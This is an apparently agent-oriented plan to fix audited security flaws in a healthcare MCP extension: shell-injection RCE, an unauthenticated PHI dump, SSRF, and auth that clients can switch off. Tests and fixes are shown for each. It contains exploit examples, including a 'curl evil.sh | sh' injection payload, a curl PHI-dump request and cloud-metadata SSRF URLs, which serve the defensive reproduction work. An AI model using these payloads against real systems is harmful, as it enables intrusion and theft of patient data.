# MCP Security Remediation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:test-driven-development for every task (reproduce → fix → prove-closed) and superpowers:executing-plans to work task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Remediate the Critical and enabling-High findings from the `extensions/mcp` security audit (`docs/security/2026-07-01-mcp-security-audit.md`) — RCE via shell injection, unauthenticated A2A PHI dump, unauthenticated SSRF relays, client-disablable auth, publication PHI leaks, and the confused-deputy identity gap — as authorized defensive work on code we own. Each finding is closed with a reproduce, fix, and prove-closed loop, committed one-finding-per-commit **inside the nested `extensions/mcp` repo**.

**Architecture:** `extensions/mcp` is `@orbital/mcp`, a workflow-package that loads *inside* the honeycomb Meteor app. It is **its own nested git repository** (`git rev-parse --show-toplevel` prints `.../extensions/mcp`; it is force-added / gitignored from the parent monorepo per the package-git-topology memo). **All commits in this plan happen inside `extensions/mcp/`, NOT the honeycomb parent.** The parent app supplies the authoritative auth spine at `server/lib/FhirAuth.js` (exports `parseUserAuthorization(req)` returning `authorizationContext | false`, plus `isAuthorized`, `applyGranularScopeFilters`); the mcp package has **no** `server/lib/FhirAuth.js` of its own and must import the parent's via an absolute-from-app-root specifier (`/server/lib/FhirAuth.js`), the same way other in-app modules reach app code.

**Tech Stack:** Meteor v3 (async collection ops), Node `child_process.spawn` (`Npm.require`), `meteor/fetch`, mocha + chai test harness (`meteortesting:mocha`, run with `npm test` at the honeycomb root, i.e. `meteor test --once --driver-package meteortesting:mocha`; server specs are guarded by `if (Meteor.isServer)`). Existing mcp specs live in `extensions/mcp/tests/**/*.test.js`.

## Global Constraints

- **Secure-by-default / fail-closed.** Every method or route that touches PHI, egress, or code execution must deny by default and require positive authorization; never key security off a `settings.public.*` (client-visible) flag.
- **Commit boundary is `extensions/mcp/`.** Before each commit: `cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel` must print the `extensions/mcp` path. One finding = one commit. End every commit message with the Claude Code co-author trailer.
- **Remediation order is fixed by the audit** (§ Recommended remediation order): C1, then (C2 + C4), then H1, then (C3 design-note + H3 + H5). C3's full identity-threading refactor STOPS for human review; only the narrower auth-gate fixes ship in this plan.
- **Reuse the app auth spine, don't fork it.** Auth gates reuse `parseUserAuthorization` / `isAuthorized` from the parent `server/lib/FhirAuth.js`. Do not copy-paste a second auth implementation into mcp.
- **HUMAN-ONLY: secret rotation.** This plan changes code and removes committed insecure config, but does **not** rotate any credential. If a key was ever exposed (e.g. an `apiKey` shipped in `settings.public`), flag it in the commit body and STOP — a human rotates it out-of-band.
- **No behavior regression for the legitimate `/mcp` bearer path** — it already enforces a hashed login-token (`McpServer.js:457-476`); harden around it, don't break it.
- Follow the id-lookup anti-pattern rule (`.claude/rules/anti-patterns/id-lookup.md`): the `$or:[{id},{_id}]` lookups (L2) are noted but out of scope here except where a fix already touches the line.

## File map

| File (all under `extensions/mcp/`) | Responsibility |
|------|----------------|
| `server/methods.js` | C1 RCE fix (`llm.downloadModel` :1451); C4 SSRF gates (`a2a.fetchAgentCard` :445, `a2a.sendRequest` :670, `a2a.sendExternalRequest` :978, `mcp.proxy.*` :1250/1279/1313, `models.downloadModel` :2368); H5 method gates |
| `server/lib/ssrfGuard.js` (new) | egress host allowlist + link-local/RFC1918 blocklist helper |
| `server/routes/a2aJsonRpcRoute.js` | C2 bearer-token gate on `/api/a2a` (:79 handler) |
| `server/a2a/A2AServerFhir.js` | C2 `handleTasksGet` (:328) — never return unbounded `find({})`; scope to caller |
| `server/McpServer.js` | H1 remove `public.noAuth` + `NOAUTH` (:94-101); C3 design-note anchor (`CallToolRequestSchema` :310) |
| `server/publications/a2aTasks.js` | H3 filter `a2a.tasks` / `a2a.activeTasks` (:7/:26) by `this.userId` |
| `configs/settings.synthea.json` | H1 remove `authentication:"none"` (:144) + `disableOauth:true` (:155) |
| `docs/security/2026-07-01-mcp-c3-identity-threading-design.md` (new) | C3 design note; STOP for human review |
| `tests/security/*.test.js` (new) | one failing-then-passing spec per finding |

---

### Task 1 (C1 — Critical): Kill RCE via shell injection in `llm.downloadModel`

**Problem:** `server/methods.js:1502` interpolates caller-controlled `model.id` into a shell string run through a promisified `child_process.exec` (`execAsync`, set up at :1466-1468):
```js
const cloneCommand = `GIT_LFS_SKIP_SMUDGE=1 git clone https://huggingface.co/${model.id} ${modelPath}`;
const { stdout, stderr } = await execAsync(cloneCommand, { maxBuffer: 1024 * 1024 * 10 });
```
`check(model, { id: String, ... })` (:1452) permits `id: '; curl evil.sh | sh #'`. There is **no `this.userId` guard before the clone** (the `this.userId` at :1536 is post-clone ownership tracking). `Meteor.call('llm.downloadModel', { id: '; curl evil.sh | sh #', ... })` yields arbitrary code as the server user.

**Files:**
- Modify: `server/methods.js` — `llm.downloadModel` (:1451-1520 region)
- Test: `tests/security/c1-download-model-rce.test.js` (new)

**Interfaces:**
- After the fix, `model.id` must match `^[\w.-]+\/[\w.-]+$` (owner/repo, no shell metacharacters) or the method throws `Meteor.Error('invalid-argument', ...)` before any process spawn. The git clone runs via `spawn('git', ['clone', url, path])` (arg array, no shell string), where `url = 'https://huggingface.co/' + model.id`. An auth gate (`if (!this.userId) throw new Meteor.Error('not-authorized')`) precedes all of it.

- [ ] **Step 1 (reproduce):** Write `tests/security/c1-download-model-rce.test.js`. Server-guarded mocha/chai spec that invokes the method via the handler map (so the guard runs) with a malicious id and asserts rejection **before** any clone:
  ```js
  import { Meteor } from 'meteor/meteor';
  import { expect } from 'chai';

  if (Meteor.isServer) {
    describe('C1 — llm.downloadModel shell injection', function() {
      it('rejects a model.id containing shell metacharacters', async function() {
        const malicious = {
          id: '; touch /tmp/pwned_c1 #', name: 'x', size: '1B', score: 1,
          description: 'x', huggingfaceUrl: 'x', downloadSize: '1B', quantized: false
        };
        let threw = false;
        try {
          await Meteor.server.method_handlers['llm.downloadModel'].call({ userId: 'testuser' }, malicious);
        } catch (e) { threw = true; expect(e.error).to.match(/invalid-argument|not-authorized/); }
        expect(threw, 'malicious id must be rejected').to.equal(true);
      });
      it('rejects an unauthenticated caller', async function() {
        let threw = false;
        try {
          await Meteor.server.method_handlers['llm.downloadModel'].call({ userId: null }, {
            id: 'owner/repo', name: 'x', size: '1B', score: 1, description: 'x',
            huggingfaceUrl: 'x', downloadSize: '1B', quantized: false
          });
        } catch (e) { threw = true; expect(e.error).to.equal('not-authorized'); }
        expect(threw).to.equal(true);
      });
    });
  }
  ```
- [ ] **Step 2 (run → FAIL):** `cd /Volumes/MobileDev/Code/honeycomb && npm test 2>&1 | grep -A3 'C1 —'`. Expect both specs to FAIL (method currently accepts the id and reaches the clone).
- [ ] **Step 3 (fix):** In `server/methods.js`, at the top of `'llm.downloadModel': async function(model)` (right after the `check(...)` block ending :1461), add the auth + format gate:
  ```js
  if (!this.userId) {
    throw new Meteor.Error('not-authorized', 'llm.downloadModel requires an authenticated user');
  }
  // Hugging Face repo ids are owner/repo — reject anything with shell metacharacters
  if (!/^[\w.-]+\/[\w.-]+$/.test(model.id)) {
    throw new Meteor.Error('invalid-argument', 'model.id must match owner/repo (alphanumerics, . _ -)');
  }
  ```
  Then replace the interpolated clone (:1502-1507) with an arg-array `spawn`. Add a `spawn` helper near the other `Npm.require`s at :1466:
  ```js
  const { spawn } = Npm.require('child_process');
  const spawnGit = function(args, opts) {
    return new Promise(function(resolve, reject) {
      const child = spawn('git', args, Object.assign({ stdio: ['ignore', 'pipe', 'pipe'] }, opts));
      let stderr = '';
      child.stderr.on('data', function(d) { stderr += d.toString(); });
      child.on('error', reject);
      child.on('close', function(code) {
        if (code === 0) resolve();
        else reject(new Error('git ' + args.join(' ') + ' exited ' + code + ': ' + stderr));
      });
    });
  };
  // ...replace the cloneCommand / execAsync block with:
  const cloneUrl = 'https://huggingface.co/' + model.id;
  await spawnGit(['clone', cloneUrl, modelPath], {
    env: Object.assign({}, process.env, { GIT_LFS_SKIP_SMUDGE: '1' })
  });
  ```
  Convert the later `git lfs pull` (:1515) to `spawnGit(['lfs', 'pull'], { cwd: modelPath })` for consistency (its args are server-derived, not caller-controlled).
- [ ] **Step 4 (prove-closed):** `cd /Volumes/MobileDev/Code/honeycomb && npm test 2>&1 | grep -A3 'C1 —'` shows both specs PASS. Then grep-audit that no interpolated exec with a caller value remains: `sed -n '1451,1525p' extensions/mcp/server/methods.js | grep -nE 'execAsync|exec\('` returns only the git-lfs *install* helpers (constant strings), never `${model`.
- [ ] **Step 5 (commit — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp
  git rev-parse --show-toplevel   # must end in /extensions/mcp
  git add server/methods.js tests/security/c1-download-model-rce.test.js
  git commit -m "fix(security): C1 — prevent RCE in llm.downloadModel (validate model.id, spawn arg-array, auth-gate)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

### Task 2 (C2 — Critical): Authenticate `/api/a2a` and stop the unbounded task PHI dump

**Problem:** `server/routes/a2aJsonRpcRoute.js` registers `WebApp.connectHandlers.use('/api/a2a', ...)` (:79) with wildcard CORS (:46-48) and **no token check** before dispatching `message/send`, `message/stream`, `tasks/get`, `tasks/cancel` (switch at :116). `A2AServerFhir.handleTasksGet(params)` (:328) returns a single task when `taskId` is present but **all tasks via `A2ATasks.findAsync({}).fetch()` when `taskId` is omitted** (:347). Task histories carry patient names and clinical text. Exploit: `curl -X POST host/api/a2a -d '{"jsonrpc":"2.0","id":1,"method":"tasks/get","params":{}}'` returns every task's PHI, unauthenticated.

**Files:**
- Modify: `server/routes/a2aJsonRpcRoute.js` — add a bearer gate before the switch (:114)
- Modify: `server/a2a/A2AServerFhir.js` — `handleTasksGet` (:326-350): remove the unbounded branch
- Test: `tests/security/c2-a2a-unauth.test.js` (new)

**Interfaces:**
- The `/api/a2a` handler calls `parseUserAuthorization(req)` (from the parent `/server/lib/FhirAuth.js`); a falsy result yields a `401` JSON-RPC error and the request never reaches the switch. `handleTasksGet` requires a `taskId` (throws on omission); it must **never** call `find({})` for a bulk return over this transport.

- [ ] **Step 1 (reproduce):** Write `tests/security/c2-a2a-unauth.test.js`:
  ```js
  import { Meteor } from 'meteor/meteor';
  import { expect } from 'chai';
  import { A2AServerFhir } from '../../server/a2a/A2AServerFhir.js';

  if (Meteor.isServer) {
    describe('C2 — A2A tasks/get PHI dump', function() {
      it('handleTasksGet without a taskId does not return all tasks', async function() {
        const server = new A2AServerFhir({ debug: false });
        await server.initialize();
        let threw = false;
        try { await server.handleTasksGet({}); }   // no taskId
        catch (e) { threw = true; }
        expect(threw, 'omitting taskId must throw, not dump all tasks').to.equal(true);
      });
      it('POST /api/a2a without a bearer token is rejected', async function() {
        const res = await fetch('http://localhost:3000/api/a2a', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tasks/get', params: {} })
        });
        expect(res.status).to.equal(401);
      });
    });
  }
  ```
  (The HTTP assertion runs under `--full-app`; if the harness can't reach the live port, keep the `handleTasksGet` unit assertion as the load-bearing one and mark the fetch spec `.skip` with a comment.)
- [ ] **Step 2 (run → FAIL):** `npm test 2>&1 | grep -A3 'C2 —'`. `handleTasksGet({})` currently returns the full array (no throw), so it FAILs.
- [ ] **Step 3a (fix the sink):** In `server/a2a/A2AServerFhir.js`, replace the `else { const tasks = await A2ATasks.findAsync({}).fetch(); ... }` branch of `handleTasksGet` (:345-349) with a hard requirement:
  ```js
  async handleTasksGet(params) {
    const taskId = get(params, 'taskId');
    if (!taskId) {
      throw new Error('taskId is required'); // never bulk-return over A2A
    }
    const task = await A2ATasks.findOneAsync({ $or: [{ id: taskId }, { _id: taskId }] });
    if (!task) { throw new Error('Task not found: ' + taskId); }
    return this.serializeFhirTask(task);
  }
  ```
- [ ] **Step 3b (fix the gate):** In `server/routes/a2aJsonRpcRoute.js`, import the app auth spine and gate the handler *before* the switch. After the JSON body is parsed and before `let result;` (:112-114), insert:
  ```js
  import { parseUserAuthorization } from '/server/lib/FhirAuth.js';
  // ...inside the handler, before the method switch:
  const authorizationContext = await parseUserAuthorization(req);
  if (!authorizationContext) {
    res.writeHead(401, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ jsonrpc: '2.0', id: get(jsonRpcRequest, 'id', null),
      error: { code: -32001, message: 'Unauthorized' } }));
    return;
  }
  ```
  (Do not touch the CORS lines in this task — wildcard-CORS hardening is H5/Task 5 scope. The bearer gate is the load-bearing fix; note the CORS follow-up in the commit body.)
- [ ] **Step 4 (prove-closed):** `npm test 2>&1 | grep -A3 'C2 —'` shows PASS. Manual check: `grep -n "findAsync({})\|find({})" extensions/mcp/server/a2a/A2AServerFhir.js` returns no hit inside `handleTasksGet`.
- [ ] **Step 5 (commit — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel
  git add server/routes/a2aJsonRpcRoute.js server/a2a/A2AServerFhir.js tests/security/c2-a2a-unauth.test.js
  git commit -m "fix(security): C2 — authenticate /api/a2a and require taskId (stop unbounded PHI task dump)

Follow-up: wildcard CORS on this route tightened in H5. No secrets rotated.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

### Task 3 (C4 — Critical): Auth-gate + SSRF-allowlist the URL-fetching methods

**Problem:** `server/methods.js` methods `fetch()` caller-supplied URLs with no auth and no host allowlist: `a2a.fetchAgentCard(url)` (:445), `a2a.sendRequest(url, requestBody, headers = {})` (:670 — attacker controls headers **and** body), `a2a.sendExternalRequest(params)` (:978), `mcp.proxy.listTools(serverUrl)` (:1250), `mcp.proxy.executeTool(serverUrl, toolName, args)` (:1279), `mcp.proxy.getStatus(serverUrl)` (:1313), `models.downloadModel(url, modelName)` (:2368). Exploit: `Meteor.call('a2a.sendRequest','http://169.254.169.254/latest/meta-data/...',{})` yields cloud-metadata exfil returned to the caller; `mcp.proxy.*` is an open POST relay.

**Files:**
- Create: `server/lib/ssrfGuard.js`
- Modify: `server/methods.js` — the seven methods above
- Test: `tests/security/c4-ssrf.test.js` (new)

**Interfaces:**
- `assertEgressAllowed(url)` (default + named export) in `server/lib/ssrfGuard.js`: parses `url`; throws `Meteor.Error('egress-blocked', ...)` unless scheme is `http`/`https` AND host is not an IP literal in link-local (`169.254.0.0/16`, `fe80::/10`), loopback (`127.0.0.0/8`, `::1`), or RFC1918 (`10/8`, `172.16/12`, `192.168/16`) ranges, AND (when `settings.private.mcp.egressAllowlist` is set) host is in that allowlist. When no allowlist is configured, DNS-name hosts are permitted but IP-literal private/link-local targets are always blocked (fail-closed on the classic SSRF vectors). Each of the seven methods gains a leading `if (!this.userId) throw new Meteor.Error('not-authorized')` and an `assertEgressAllowed(url)` call before the `fetch`.

- [ ] **Step 1 (reproduce):** Write `tests/security/c4-ssrf.test.js`:
  ```js
  import { Meteor } from 'meteor/meteor';
  import { expect } from 'chai';
  import { assertEgressAllowed } from '../../server/lib/ssrfGuard.js';

  if (Meteor.isServer) {
    describe('C4 — SSRF egress guard', function() {
      const blocked = [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1:3000/admin',
        'http://10.0.0.5/internal',
        'http://192.168.1.1/',
        'http://[::1]/',
        'file:///etc/passwd'
      ];
      blocked.forEach(function(u) {
        it('blocks ' + u, function() {
          expect(function() { assertEgressAllowed(u); }).to.throw();
        });
      });
      it('allows a normal https host when no allowlist is set', function() {
        expect(function() { assertEgressAllowed('https://huggingface.co/owner/repo'); }).to.not.throw();
      });
      it('a2a.sendRequest rejects an unauthenticated caller', async function() {
        let threw = false;
        try { await Meteor.server.method_handlers['a2a.sendRequest'].call({ userId: null }, 'https://example.com', {}, {}); }
        catch (e) { threw = true; expect(e.error).to.equal('not-authorized'); }
        expect(threw).to.equal(true);
      });
    });
  }
  ```
- [ ] **Step 2 (run → FAIL):** `npm test 2>&1 | grep -A3 'C4 —'` — the `ssrfGuard` import fails and the method accepts an unauth caller, so it FAILs.
- [ ] **Step 3a (guard):** Create `server/lib/ssrfGuard.js`:
  ```js
  // extensions/mcp/server/lib/ssrfGuard.js
  import { Meteor } from 'meteor/meteor';
  import { get } from 'lodash';

  function isPrivateOrLinkLocalIp(host) {
    const h = host.replace(/^\[|\]$/g, '');
    if (h === '::1' || h.toLowerCase().startsWith('fe80:')) return true;      // IPv6 loopback / link-local
    const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
    if (!m) return false;                                                     // not an IPv4 literal
    const a = Number(m[1]); const b = Number(m[2]);
    if (a === 127) return true;                                               // loopback
    if (a === 169 && b === 254) return true;                                  // link-local (metadata)
    if (a === 10) return true;                                                // RFC1918
    if (a === 172 && b >= 16 && b <= 31) return true;                         // RFC1918
    if (a === 192 && b === 168) return true;                                  // RFC1918
    return false;
  }

  export function assertEgressAllowed(rawUrl) {
    let u;
    try { u = new URL(rawUrl); }
    catch (e) { throw new Meteor.Error('egress-blocked', 'Invalid URL'); }
    if (u.protocol !== 'http:' && u.protocol !== 'https:') {
      throw new Meteor.Error('egress-blocked', 'Only http/https egress permitted');
    }
    if (isPrivateOrLinkLocalIp(u.hostname)) {
      throw new Meteor.Error('egress-blocked', 'Private/link-local egress blocked: ' + u.hostname);
    }
    const allowlist = get(Meteor, 'settings.private.mcp.egressAllowlist', null);
    if (Array.isArray(allowlist) && allowlist.length > 0 && !allowlist.includes(u.hostname)) {
      throw new Meteor.Error('egress-blocked', 'Host not in egress allowlist: ' + u.hostname);
    }
    return true;
  }
  export default assertEgressAllowed;
  ```
- [ ] **Step 3b (apply to the seven methods):** At the top of each method in `server/methods.js`, add the auth gate and the guard (import `assertEgressAllowed` from `./lib/ssrfGuard.js` near the top imports at :1-10). Pattern (repeat per method, guarding the caller-controlled URL param — `url` for :445/:670/:2368, `params.url`/`params.endpoint` for `a2a.sendExternalRequest` :978, `serverUrl` for the three `mcp.proxy.*` :1250/:1279/:1313):
  ```js
  'a2a.sendRequest': async function(url, requestBody, headers = {}) {
    if (!this.userId) throw new Meteor.Error('not-authorized', 'a2a.sendRequest requires authentication');
    assertEgressAllowed(url);
    // ...existing body...
  },
  ```
  For `mcp.proxy.*`, guard `serverUrl`; for `models.downloadModel(url, modelName)` guard `url`. Do **not** widen the `check()` signatures.
- [ ] **Step 4 (prove-closed):** `npm test 2>&1 | grep -A3 'C4 —'` shows all PASS. Grep-audit that every fetch-of-a-param is now preceded by a guard: `grep -n "assertEgressAllowed\|this.userId\|fetch(" extensions/mcp/server/methods.js | sed -n '1,60p'` — confirm each of the seven line-numbers has an `assertEgressAllowed` + `this.userId` above its `fetch`.
- [ ] **Step 5 (commit — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel
  git add server/lib/ssrfGuard.js server/methods.js tests/security/c4-ssrf.test.js
  git commit -m "fix(security): C4 — auth-gate + SSRF egress allowlist on a2a/mcp-proxy/model fetch methods

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

### Task 4 (H1 — High): Remove the client-disablable auth switch and the shipped `auth:"none"` config

**Problem:** `server/McpServer.js:94-101`: `requireAuth()` returns `false` if `process.env.NOAUTH` **or `Meteor.settings.public.noAuth`** — a `public` (client-visible) setting can turn off server auth. And `configs/settings.synthea.json:144` ships `"authentication": "none"` with `:155 "disableOauth": true`. Until this is fixed, the C2/C3/C4 gates can be globally bypassed and a committed config disables them.

**Files:**
- Modify: `server/McpServer.js` — `requireAuth()` (:93-101)
- Modify: `configs/settings.synthea.json` — remove `authentication:"none"` (:144) + `disableOauth:true` (:155)
- Test: `tests/security/h1-requireauth.test.js` (new)

**Interfaces:**
- `requireAuth()` no longer consults `process.env.NOAUTH` or `settings.public.noAuth`. Simplest secure form for this plan: **always require auth** — `requireAuth()` returns `true` unconditionally (the `/mcp` bearer path stays; there is no client-reachable off-switch). Committed configs no longer contain `authentication:"none"` / `disableOauth:true`.

- [ ] **Step 1 (reproduce):** Write `tests/security/h1-requireauth.test.js`:
  ```js
  import { Meteor } from 'meteor/meteor';
  import { expect } from 'chai';
  import { requireAuth } from '../../server/McpServer.js';

  if (Meteor.isServer) {
    describe('H1 — auth cannot be disabled by a public flag', function() {
      it('requireAuth ignores settings.public.noAuth', function() {
        const prev = Meteor.settings.public && Meteor.settings.public.noAuth;
        Meteor.settings.public = Object.assign({}, Meteor.settings.public, { noAuth: true });
        expect(requireAuth()).to.equal(true);
        Meteor.settings.public.noAuth = prev;
      });
      it('requireAuth ignores process.env.NOAUTH', function() {
        const prev = process.env.NOAUTH; process.env.NOAUTH = '1';
        expect(requireAuth()).to.equal(true);
        if (prev === undefined) delete process.env.NOAUTH; else process.env.NOAUTH = prev;
      });
    });
  }
  ```
  (`requireAuth` is already exported at `McpServer.js:521` — `export { requireAuth, validateToken }`.)
- [ ] **Step 2 (run → FAIL):** `npm test 2>&1 | grep -A3 'H1 —'` — both FAIL (the flags currently disable auth).
- [ ] **Step 3a (code):** In `server/McpServer.js`, replace the body of `requireAuth` (:93-101) with a fail-closed version:
  ```js
  const requireAuth = function() {
    // Fail closed: MCP auth is not disablable via client-visible settings or env.
    // (Removed process.env.NOAUTH and Meteor.settings.public.noAuth backdoors — security fix H1.)
    // settings.private.mcp.authentication is read for intent but 'none' is no longer honored.
    return true;
  };
  ```
  (If a future controlled test-only bypass is ever needed, it must be `settings.private.*` gated AND env-guarded to non-production — out of scope here.)
- [ ] **Step 3b (config):** In `configs/settings.synthea.json`, delete the `"authentication": "none"` line (:144) — leaving the mcp block to default to secure — and set `"disableOauth"` (:155) to `false` (or remove it). Validate JSON: `node -e "require('./extensions/mcp/configs/settings.synthea.json'); console.log('json ok')"`.
- [ ] **Step 4 (prove-closed):** `npm test 2>&1 | grep -A3 'H1 —'` shows PASS. `grep -rn "authentication.*none\|disableOauth.*true\|public.noAuth\|process.env.NOAUTH" extensions/mcp/` returns no matches in `server/` or committed `configs/`.
- [ ] **Step 5 (commit — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel
  git add server/McpServer.js configs/settings.synthea.json tests/security/h1-requireauth.test.js
  git commit -m "fix(security): H1 — make MCP auth fail-closed (remove NOAUTH/public.noAuth + shipped auth:none)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

### Task 5 (H3 + H5 — High): Filter A2A publications and gate the ungated methods

**Problem (H3):** `server/publications/a2aTasks.js` publishes `A2ATasks.find({})` with no `this.userId` filter — `a2a.tasks` (:7) and `a2a.activeTasks` (:26) both return **all** patients' tasks to any authenticated session (the code comment at :10 admits "publish all tasks (in production, filter by user/role)"). **Problem (H5):** 14 of 48 methods lack a `this.userId` gate — notably `a2a.deleteTask` (deletes any task by id), `mcp.executeTool`, and `llm.saveConfig` (overwrites the shared in-memory `llmConfig`).

**Files:**
- Modify: `server/publications/a2aTasks.js` — `a2a.tasks` (:7), `a2a.activeTasks` (:26)
- Modify: `server/methods.js` — add `if (!this.userId) throw ...` to the ungated methods
- Test: `tests/security/h3h5-authz.test.js` (new)

**Interfaces:**
- `a2a.tasks` / `a2a.activeTasks`: `if (!this.userId) { this.ready(); return; }` and the `find` selector gains a caller-scope clause (owner/user field on the task, or — if tasks are not yet owner-stamped — return nothing for anonymous and log a TODO for compartment scoping, keeping the fail-closed posture). The ungated methods each throw `Meteor.Error('not-authorized')` when `!this.userId`.

- [ ] **Step 1 (reproduce):** Write `tests/security/h3h5-authz.test.js`:
  ```js
  import { Meteor } from 'meteor/meteor';
  import { expect } from 'chai';

  if (Meteor.isServer) {
    describe('H3/H5 — A2A authz', function() {
      it('a2a.tasks publication returns nothing to an anonymous session', function() {
        const pub = Meteor.server.publish_handlers['a2a.tasks'];
        let readied = false;
        const fakeSub = { userId: null, ready() { readied = true; }, stop() {} };
        const cursor = pub.call(fakeSub);
        expect(readied || cursor === undefined).to.equal(true);
      });
      it('a2a.deleteTask rejects an unauthenticated caller', async function() {
        let threw = false;
        try { await Meteor.server.method_handlers['a2a.deleteTask'].call({ userId: null }, 'someid'); }
        catch (e) { threw = true; expect(e.error).to.equal('not-authorized'); }
        expect(threw).to.equal(true);
      });
    });
  }
  ```
- [ ] **Step 2 (run → FAIL):** `npm test 2>&1 | grep -A3 'H3/H5 —'` — FAIL (pub returns a cursor for anon; delete accepts anon).
- [ ] **Step 3a (publications):** In `server/publications/a2aTasks.js`, add to the top of `a2a.tasks` (:7) and `a2a.activeTasks` (:26):
  ```js
  if (!this.userId) { this.ready(); return; }
  ```
  and add a caller-scope clause to each `find` selector. If `A2ATasks` documents carry an owning-user/practitioner field, filter by it; otherwise scope by the authenticated user's patient-compartment (the `selectedPatientId` contract) and leave a `// TODO(compartment): full patient-compartment filter — see C3 design note` marker. Keep the `limit: 100`.
- [ ] **Step 3b (method gates):** Enumerate the ungated methods first: `grep -nE "': async function|': function" extensions/mcp/server/methods.js` lists all 48; cross-reference which lack `this.userId`. For each ungated **mutating or PHI-returning** method (at minimum `a2a.deleteTask`, `mcp.executeTool`, `llm.saveConfig`), add `if (!this.userId) throw new Meteor.Error('not-authorized', '<method> requires authentication');` as the first statement after `check(...)`. (Read-only introspection methods that expose no PHI may stay open, but note each such exception in the commit body.)
- [ ] **Step 4 (prove-closed):** `npm test 2>&1 | grep -A3 'H3/H5 —'` shows PASS. Recount guards: `grep -c "this.userId" extensions/mcp/server/methods.js` increased; `grep -n "find({})" extensions/mcp/server/publications/a2aTasks.js` shows the anon-guard + scope clause in place.
- [ ] **Step 5 (commit — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel
  git add server/publications/a2aTasks.js server/methods.js tests/security/h3h5-authz.test.js
  git commit -m "fix(security): H3/H5 — scope A2A task publications + auth-gate ungated methods

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

### Task 6 (C3 — Critical): Design note for confused-deputy identity threading — STOP for human review

**Problem:** `server/McpServer.js` `CallToolRequestSchema` handler (:310) calls `searchFhirResources(args.resourceType, args.params || {})` (:316) with **no** `parseUserAuthorization`, no ACL, no patient-compartment filter. Even on the auth-gated `/mcp` path, the validated user (`req.mcpUser`, set at :475) is never propagated into `handleMessage` (:36) and thus never into the tool handler. Any caller reaching a tool reads *all* patients' data a REST `/baseR4/Patient` call would filter. This is architecturally the same problem the `ServerMethods` identity pipeline in the methods-migration spec centralizes — a **big refactor**, not a one-liner.

**Files:**
- Create: `docs/security/2026-07-01-mcp-c3-identity-threading-design.md`
- (No code change in this task — the narrower auth gates from Tasks 2-5 already reduce reachability; C3's compartment enforcement is deferred to the reviewed refactor.)

**Interfaces:**
- A written design note (not code) proposing how `req.mcpUser` → `authorizationContext` flows from `McpServer.js:475` through `handleMessage` (:36) into every `setRequestHandler` tool body, and how tool handlers must call the same `isAuthorized` / `applyGranularScopeFilters` path as the REST layer before `searchFhirResources`. The note ends the task; a human approves the architecture before the refactor is scheduled.

- [ ] **Step 1 (write the note):** Create `docs/security/2026-07-01-mcp-c3-identity-threading-design.md` covering: (a) the exact gap — `handleMessage(request)` (:36) has no identity parameter, so tool handlers (:271, :310) run with ambient server privilege; (b) proposed thread — pass `req.mcpUser`/`authorizationContext` into `mcpServer.handleMessage(request, authorizationContext)` at the call site (:480 region) and into each `setRequestHandler` closure; (c) enforcement — every FHIR-touching tool (`searchFhirResources`, `getFhirResource`, `McpExternalFhirTools`) must apply `applyGranularScopeFilters` / `isAuthorized` from `/server/lib/FhirAuth.js` keyed on the caller before querying; (d) alignment with the `ServerMethods` identity pipeline from the methods-migration spec (reuse, don't reinvent); (e) blast-radius / test plan for the refactor.
- [ ] **Step 2 (interim mitigation cross-reference):** In the note, record that Tasks 2 (A2A auth), 4 (fail-closed `requireAuth`), and 5 (publication scope) already prevent *unauthenticated* reach to tools, but authenticated cross-patient reads via `tools/call` remain **open until the refactor** — so the `/mcp` path should stay restricted to trusted callers meanwhile. State this residual risk explicitly.
- [ ] **Step 3 (STOP — human review):** Do **not** begin the identity-threading refactor. Present the design note and wait for human approval of the architecture before any `handleMessage` signature change. This is the reviewed-checkpoint boundary.
- [ ] **Step 4 (commit the note — inside extensions/mcp):**
  ```bash
  cd /Volumes/MobileDev/Code/honeycomb/extensions/mcp && git rev-parse --show-toplevel
  git add docs/security/2026-07-01-mcp-c3-identity-threading-design.md
  git commit -m "docs(security): C3 — identity-threading design note for MCP tool confused-deputy (awaiting human review)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
  ```

---

## Deferred / HUMAN-ONLY (not in this plan)

- **HUMAN-ONLY — secret rotation.** If review of M1 (`client/ui/components/LLMProviderDialog.jsx:68-69` reading `settings.public.openai.apiKey` / `...anthropic.apiKey`) shows a real key was ever committed to a `settings.public.*` block, a human must rotate that key out-of-band. This plan does not touch or rotate credentials.
- **C3 refactor** — the full identity-threading + compartment enforcement (Task 6's design note) is scheduled only after human sign-off.
- **H2** (A2A PHI → external LLM egress; default `administratorAutoRespond:true` at `A2AServerFhir.js:695`), **H4** (plaintext PHI vector store, `McpLocalVectorSearch.js:68/130`), and the **Mediums/Lows** (M1–M4, L1–L3) — a follow-up cleanup pass per the audit's remediation order step 5–6.
- **Out-of-scope leads** (Stripe webhook idempotency, IPFS config) — separate audit, not `extensions/mcp`.

## Self-review notes (applied)

